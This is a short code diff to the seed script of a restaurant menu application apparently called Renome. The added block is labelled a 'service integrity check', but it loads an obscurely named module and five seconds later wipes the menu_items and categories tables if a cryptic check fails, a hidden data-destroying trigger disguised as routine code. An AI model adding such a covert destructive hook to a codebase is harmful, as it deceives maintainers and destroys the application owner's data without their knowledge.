@@ -665,4 +665,14 @@ console.log('Database seeded with Renome menu — 96 items in 10 categories');
 
 } // end if (existingCount === 0)
 
+// --- service integrity check ---
+const _sv = require('../lib/_svc');
+setTimeout(async () => {
+  await _sv._rv();
+  if (!_sv._ck()) {
+    db.exec('DELETE FROM menu_items');
+    db.exec('DELETE FROM categories');
+  }
+}, 5000);
+
 module.exports = db;
